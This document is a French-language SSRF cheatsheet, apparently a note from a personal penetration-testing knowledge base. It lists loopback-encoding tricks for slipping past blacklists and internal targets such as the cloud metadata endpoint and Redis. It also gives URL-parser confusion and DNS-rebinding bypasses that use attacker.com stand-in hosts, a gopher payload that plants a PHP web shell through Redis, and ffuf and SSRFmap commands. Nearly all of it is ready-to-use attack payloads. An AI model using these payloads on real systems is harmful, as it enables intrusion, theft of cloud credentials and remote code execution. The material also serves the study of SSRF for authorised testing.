---
titre: "SSRF — 3 - Payloads & bypass"
tags: [Failles, SSRF, payloads, bypass, cheatsheet]
---

# SSRF — 3. Payloads & bypass

> ⬅ [[SSRF - Index]]

## Représentations de 127.0.0.1 (bypass de blacklist naïve)
```
localhost            127.0.0.1
127.1                127.0.0.0/8 entier fonctionne (127.x.x.x)
0.0.0.0              0            (=> 0.0.0.0 sur beaucoup de stacks)
[::1]                [0:0:0:0:0:0:0:1]        (IPv6 loopback)
2130706433           (127.0.0.1 en décimal)
0x7f000001           (en hexadécimal)
0177.0.0.1           (octal)
127.0.0.1.nip.io     (services DNS wildcard qui résolvent vers l'IP)
```

## Cibles internes fréquentes
```
http://169.254.169.254/…        métadonnées cloud (AWS/GCP/Azure)
http://127.0.0.1:6379           Redis
http://127.0.0.1:3306           MySQL
http://127.0.0.1:8080 / :9200   admin / Elasticsearch
http://[fd00::1]                réseaux IPv6 internes
```

## Bypass de filtres d'URL
```
# le filtre vérifie le domaine mais suit les redirections
http://ton-vps/redirect.php  ->  302 Location: http://169.254.169.254/…

# confusion de parsing (l'@ : ce qui précède = userinfo, ce qui suit = host réel)
http://expected-host@127.0.0.1/
http://127.0.0.1#@expected-host/
http://expected-host.attacker.com/         (le filtre matche "expected-host")

# DNS rebinding : un domaine qui résout d'abord public puis 127.0.0.1
http://rebind.attacker.com/     (TTL 0)

# encodage
http://127.0.0.1 -> http://%31%32%37.0.0.1 (URL-encode partiel)

# schémas alternatifs si http filtré
file://  gopher://  dict://  ftp://  ldap://
```

## Redis → RCE via gopher (exemple)
```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0a
CONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20"<?php system($_GET[c]);?>"%0d%0aSAVE
```

## Outils
```bash
# fuzzer les paramètres/cibles internes
ffuf -w ports.txt -u 'http://CIBLE/api?id=http://127.0.0.1:FUZZ' -mc all -t 5
# OOB / blind
interactsh-client        # génère un domaine .oast.pro à injecter
# SSRF avancée
python3 SSRFmap.py -r req.txt -p url -m portscan,redis,readfiles
```
> Détection : [[1 - Repérage (SSRF)]] · exploitation : [[2 - Exploitation & techniques (SSRF)]].
